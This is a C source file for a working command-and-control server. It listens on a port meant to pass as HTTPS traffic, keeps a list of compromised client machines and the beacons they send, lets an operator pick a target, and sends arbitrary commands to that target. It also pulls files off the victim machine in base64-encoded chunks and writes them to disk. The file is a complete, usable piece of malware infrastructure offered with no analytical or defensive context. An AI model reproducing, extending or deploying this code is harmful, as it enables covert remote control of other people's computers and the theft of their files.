#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/select.h>
#include <stdint.h>

#define PACKET_SIZE 8192
#define MAX_CLIENTS 10
#define MAX_FILENAME 256
#define CHUNK_SIZE 1536
#define C2_PORT 8443  // Disguised as HTTPS alternative port
#define C2_MAGIC "C2_"  // Magic prefix for C2 traffic

typedef struct {
    int socket;
    char ip[16];
    time_t last_seen;
    int active;
} client_info_t;

typedef struct {
    char filename[MAX_FILENAME];
    FILE *fp;
    int active;
    int chunk_count;
    int expected_chunks;
    long expected_size;
    long received_size;
} download_session_t;

client_info_t clients[MAX_CLIENTS];
download_session_t download_session = {0};
int client_count = 0;
int current_client = -1;
int server_socket;

// Function declarations
int base64_decode(const char* input, unsigned char* output, int output_size);
void handle_download_start(const char* data);
void handle_download_complete();

void send_tcp_command(int client_socket, const char* command) {
    char c2_payload[PACKET_SIZE];
    snprintf(c2_payload, sizeof(c2_payload), "%s%s", C2_MAGIC, command);
    
    uint32_t length = htonl(strlen(c2_payload));
    
    // Send length first, then data
    if (send(client_socket, &length, sizeof(length), 0) < 0) {
        perror("Failed to send command length");
        return;
    }
    
    if (send(client_socket, c2_payload, strlen(c2_payload), 0) < 0) {
        perror("Failed to send command");
        return;
    }
    
    printf("Sent command: %s\n", command);
}

// Base64 decoding function
int base64_decode(const char* input, unsigned char* output, int output_size) {
    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int input_len = strlen(input);
    int output_len = 0;
    uint32_t buffer = 0;
    int bits_collected = 0;
    
    for (int i = 0; i < input_len; i++) {
        char c = input[i];
        if (c == '=') break; // Padding
        
        // Find character in base64 alphabet
        int value = -1;
        for (int j = 0; j < 64; j++) {
            if (base64_chars[j] == c) {
                value = j;
                break;
            }
        }
        
        if (value == -1) continue; // Skip invalid characters
        
        buffer = (buffer << 6) | value;
        bits_collected += 6;
        
        if (bits_collected >= 8) {
            if (output_len >= output_size) return -1; // Output buffer too small
            output[output_len++] = (buffer >> (bits_collected - 8)) & 0xFF;
            bits_collected -= 8;
        }
    }
    
    return output_len;
}

void handle_download_start(const char* data) {
    // Parse: DOWNLOAD_START:<filename>:<filesize>:<total_chunks>
    char data_copy[PACKET_SIZE];
    strncpy(data_copy, data + 18, PACKET_SIZE - 1); // Skip "C2_DOWNLOAD_START:"
    data_copy[PACKET_SIZE - 1] = '\0';
    
    char *filename = data_copy;
    char *filesize_str = strchr(filename, ':');
    if (!filesize_str) return;
    *filesize_str = '\0';
    filesize_str++;
    
    char *chunks_str = strchr(filesize_str, ':');
    if (!chunks_str) return;
    *chunks_str = '\0';
    chunks_str++;
    
    long filesize = atol(filesize_str);
    int total_chunks = atoi(chunks_str);
    
    // Initialize download session
    memset(&download_session, 0, sizeof(download_session));
    strncpy(download_session.filename, filename, MAX_FILENAME - 1);
    
    // Create downloads directory if it doesn't exist
    system("mkdir -p downloads");
    
    // Extract basename for local storage
    const char* basename = strrchr(filename, '/');
    if (basename) {
        basename++;
    } else {
        basename = filename;
    }
    
    if (strlen(basename) == 0) {
        basename = "downloaded_file";
    }
    
    char filepath[MAX_FILENAME + 20];
    snprintf(filepath, sizeof(filepath), "downloads/%s", basename);
    
    download_session.fp = fopen(filepath, "wb");
    if (download_session.fp == NULL) {
        printf("Error: Could not create file %s\n", filepath);
        return;
    }
    
    download_session.active = 1;
    download_session.chunk_count = 0;
    download_session.expected_chunks = total_chunks;
    download_session.expected_size = filesize;
    download_session.received_size = 0;
    
    printf("[+] Download session started: %s (%ld bytes, %d chunks) -> %s\n", 
           filename, filesize, total_chunks, filepath);
}

void handle_download_chunk(const char* data, const char* client_ip) {
    if (!download_session.active) {
        printf("[-] Received download chunk but no active session\n");
        return;
    }
    
    // Parse: DOWNLOAD_CHUNK:<chunk_num>:<total_chunks>:<original_size>:<base64_data>
    char data_copy[PACKET_SIZE];
    strncpy(data_copy, data + 18, PACKET_SIZE - 1); // Skip "C2_DOWNLOAD_CHUNK:"
    data_copy[PACKET_SIZE - 1] = '\0';
    
    char *chunk_str = data_copy;
    char *total_str = strchr(chunk_str, ':');
    if (!total_str) return;
    *total_str = '\0';
    total_str++;
    
    char *size_str = strchr(total_str, ':');
    if (!size_str) return;
    *size_str = '\0';
    size_str++;
    
    char *b64_data = strchr(size_str, ':');
    if (!b64_data) return;
    *b64_data = '\0';
    b64_data++;
    
    int chunk_num = atoi(chunk_str);
    int total_chunks = atoi(total_str);
    int original_size = atoi(size_str);
    
    // Decode base64 data
    unsigned char decoded_data[CHUNK_SIZE + 100];
    int decoded_len = base64_decode(b64_data, decoded_data, sizeof(decoded_data));
    
    if (decoded_len != original_size) {
        printf("[-] Warning: Decoded size mismatch (expected %d, got %d)\n", 
               original_size, decoded_len);
    }
    
    // Write decoded data to file
    if (download_session.fp && decoded_len > 0) {
        fwrite(decoded_data, 1, decoded_len, download_session.fp);
        fflush(download_session.fp);
        download_session.received_size += decoded_len;
    }
    
    download_session.chunk_count++;
    printf("[+] Received chunk %d/%d (%d bytes) - Total: %ld/%ld bytes\n", 
           chunk_num, total_chunks, decoded_len, 
           download_session.received_size, download_session.expected_size);
    
    // Check if download is complete
    if (download_session.chunk_count >= download_session.expected_chunks) {
        fclose(download_session.fp);
        printf("[+] Download completed: downloads/%s (%ld bytes)\n", 
               download_session.filename, download_session.received_size);
        download_session.active = 0;
        memset(&download_session, 0, sizeof(download_session));
    }
}

void handle_download_complete() {
    if (download_session.active) {
        fclose(download_session.fp);
        printf("[+] Download completed: downloads/%s (%ld bytes)\n", 
               download_session.filename, download_session.received_size);
        download_session.active = 0;
        memset(&download_session, 0, sizeof(download_session));
    }
}

void handle_download_error(const char* data) {
    if (download_session.active) {
        fclose(download_session.fp);
        download_session.active = 0;
        printf("[-] Download failed: %s\n", data + 18); // Skip C2_DOWNLOAD_ERROR:
    }
}

void add_client(int client_socket, const char* client_ip) {
    // Check if client already exists
    for (int i = 0; i < client_count; i++) {
        if (strcmp(clients[i].ip, client_ip) == 0 && clients[i].active) {
            clients[i].last_seen = time(NULL);
            return;
        }
    }

    // Add new client
    if (client_count < MAX_CLIENTS) {
        clients[client_count].socket = client_socket;
        strcpy(clients[client_count].ip, client_ip);
        clients[client_count].last_seen = time(NULL);
        clients[client_count].active = 1;
        
        printf("[+] New client connected: %s (socket %d)\n", client_ip, client_socket);
        
        // Auto-select first client
        if (current_client == -1) {
            current_client = client_count;
            printf("[+] Auto-selected target: %s\n", client_ip);
        }
        
        client_count++;
    }
}

void remove_client(int client_socket) {
    for (int i = 0; i < client_count; i++) {
        if (clients[i].socket == client_socket) {
            printf("[-] Client disconnected: %s\n", clients[i].ip);
            clients[i].active = 0;
            close(clients[i].socket);
            
            // If this was the current client, reset selection
            if (current_client == i) {
                current_client = -1;
                // Try to auto-select another active client
                for (int j = 0; j < client_count; j++) {
                    if (clients[j].active) {
                        current_client = j;
                        printf("[+] Auto-selected new target: %s\n", clients[j].ip);
                        break;
                    }
                }
            }
            break;
        }
    }
}

void list_clients() {
    printf("\n=== Connected Clients ===\n");
    if (client_count == 0) {
        printf("No clients connected.\n");
        return;
    }

    time_t now = time(NULL);
    int active_count = 0;
    for (int i = 0; i < client_count; i++) {
        if (clients[i].active) {
            printf("%d. %s (socket %d, last seen: %ld seconds ago)%s\n",
                   i + 1, clients[i].ip, clients[i].socket, 
                   now - clients[i].last_seen,
                   (current_client == i) ? " [SELECTED]" : "");
            active_count++;
        }
    }
    
    if (active_count == 0) {
        printf("No active clients.\n");
    }
    
    if (download_session.active) {
        printf("Active download: %s (chunk %d/%d, %ld/%ld bytes)\n", 
               download_session.filename, 
               download_session.chunk_count, 
               download_session.expected_chunks,
               download_session.received_size,
               download_session.expected_size);
    }
    printf("=======================\n\n");
}

void set_target(int client_num) {
    if (client_num > 0 && client_num <= client_count) {
        int index = client_num - 1;
        if (clients[index].active) {
            current_client = index;
            printf("Target set to: %s\n", clients[index].ip);
        } else {
            printf("Client %d is not active.\n", client_num);
        }
    } else {
        printf("Invalid client number.\n");
    }
}

char* receive_tcp_message(int client_socket) {
    static char buffer[PACKET_SIZE];
    uint32_t length;
    
    // Receive length first
    int bytes_received = recv(client_socket, &length, sizeof(length), MSG_WAITALL);
    if (bytes_received <= 0) {
        return NULL;
    }
    
    length = ntohl(length);
    if (length >= PACKET_SIZE) {
        printf("Message too large: %d bytes\n", length);
        return NULL;
    }
    
    // Receive the actual message
    bytes_received = recv(client_socket, buffer, length, MSG_WAITALL);
    if (bytes_received <= 0) {
        return NULL;
    }
    
    buffer[length] = '\0';
    return buffer;
}

void handle_client_message(int client_socket, const char* client_ip) {
    char* message = receive_tcp_message(client_socket);
    if (!message) {
        printf("Failed to receive message from %s\n", client_ip);
        remove_client(client_socket);
        return;
    }
    
    // Check for C2 magic prefix
    if (strncmp(message, C2_MAGIC, 3) == 0) {
        const char* data = message + 3; // Skip "C2_" prefix
        
        if (strncmp(data, "BEACON", 6) == 0) {
            // Update last seen time
            for (int i = 0; i < client_count; i++) {
                if (clients[i].socket == client_socket) {
                    clients[i].last_seen = time(NULL);
                    break;
                }
            }
            printf("[+] Beacon received from %s\n", client_ip);
        } else if (strncmp(data, "DOWNLOAD_START:", 15) == 0) {
            handle_download_start(message);
        } else if (strncmp(data, "DOWNLOAD_CHUNK:", 15) == 0) {
            handle_download_chunk(message, client_ip);
        } else if (strncmp(data, "DOWNLOAD_COMPLETE", 17) == 0) {
            handle_download_complete();
        } else if (strncmp(data, "DOWNLOAD_ERROR:", 15) == 0) {
            handle_download_error(message);
        } else {
            // Regular command response
            printf("\n[Response from %s]:\n%s\n", client_ip, data);
            printf("C2 (%s)> ", current_client >= 0 ? clients[current_client].ip : "no target");
            fflush(stdout);
        }
    }
}

void print_help() {
    printf("\n=== C2 Commands ===\n");
    printf("clients               - List connected clients\n");
    printf("target <num>          - Set target client by number\n");
    printf("download <filename>   - Download file from target client\n");
    printf("help                  - Show this help\n");
    printf("exit                  - Exit C2 server\n");
    printf("Any other command will be sent to the current target\n");
    printf("==================\n\n");
}

int main() {
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    char input[256];

    // Initialize clients array
    memset(clients, 0, sizeof(clients));
    current_client = -1;

    // Create TCP socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Set socket options
    int opt = 1;
    if (setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("setsockopt failed");
        return 1;
    }

    // Configure server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(C2_PORT);

    // Bind socket
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        return 1;
    }

    // Listen for connections
    if (listen(server_socket, MAX_CLIENTS) < 0) {
        perror("Listen failed");
        return 1;
    }

    printf("TCP C2 Server started on port %d\n", C2_PORT);
    printf("Detecting C2 traffic by payload signature: %s\n", C2_MAGIC);
    print_help();

    // Set server socket to non-blocking
    fcntl(server_socket, F_SETFL, O_NONBLOCK);

    fd_set read_fds, master_fds;
    int max_fd = server_socket;
    
    FD_ZERO(&master_fds);
    FD_SET(server_socket, &master_fds);
    FD_SET(STDIN_FILENO, &master_fds);

    while (1) {
        read_fds = master_fds;
        struct timeval timeout = {1, 0}; // 1 second timeout
        
        int ready = select(max_fd + 1, &read_fds, NULL, NULL, &timeout);
        
        if (ready < 0) {
            perror("select failed");
            break;
        }

        if (ready > 0) {
            // Check for new connections
            if (FD_ISSET(server_socket, &read_fds)) {
                int client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_len);
                if (client_socket >= 0) {
                    add_client(client_socket, inet_ntoa(client_addr.sin_addr));
                    FD_SET(client_socket, &master_fds);
                    if (client_socket > max_fd) {
                        max_fd = client_socket;
                    }
                }
            }

            // Check for client messages
            for (int i = 0; i < client_count; i++) {
                if (clients[i].active && FD_ISSET(clients[i].socket, &read_fds)) {
                    handle_client_message(clients[i].socket, clients[i].ip);
                }
            }

            // Check for user input
            if (FD_ISSET(STDIN_FILENO, &read_fds)) {
                printf("C2 (%s)> ", current_client >= 0 ? clients[current_client].ip : "no target");
                fflush(stdout);

                if (!fgets(input, sizeof(input), stdin)) {
                    break;
                }

                // Remove newline
                input[strcspn(input, "\n")] = 0;

                if (strlen(input) == 0) {
                    continue;
                }

                // Process commands
                if (strcmp(input, "exit") == 0) {
                    break;
                } else if (strcmp(input, "clients") == 0) {
                    list_clients();
                } else if (strncmp(input, "target ", 7) == 0) {
                    int client_num = atoi(input + 7);
                    set_target(client_num);
                } else if (strncmp(input, "download ", 9) == 0) {
                    if (current_client >= 0 && clients[current_client].active) {
                        char *filename = input + 9;
                        while (*filename == ' ') filename++;
                        if (strlen(filename) > 0) {
                            if (download_session.active) {
                                printf("Download already in progress. Please wait.\n");
                            } else {
                                char download_cmd[300];
                                snprintf(download_cmd, sizeof(download_cmd), "DOWNLOAD:%s", filename);
                                send_tcp_command(clients[current_client].socket, download_cmd);
                                printf("Requesting file: %s\n", filename);
                            }
                        } else {
                            printf("Usage: download <filename>\n");
                        }
                    } else {
                        printf("No target selected or target not active. Use 'clients' and 'target <num>' first.\n");
                    }
                } else if (strcmp(input, "help") == 0) {
                    print_help();
                } else {
                    // Send command to current target
                    if (current_client >= 0 && clients[current_client].active) {
                        send_tcp_command(clients[current_client].socket, input);
                        printf("Waiting for response...\n");
                    } else {
                        printf("No target selected or target not active. Use 'clients' and 'target <num>' first.\n");
                    }
                }
            }
        }
    }

    // Clean up
    if (download_session.active && download_session.fp) {
        fclose(download_session.fp);
    }

    for (int i = 0; i < client_count; i++) {
        if (clients[i].active) {
            close(clients[i].socket);
        }
    }

    printf("Shutting down C2 server...\n");
    close(server_socket);
    return 0;
}
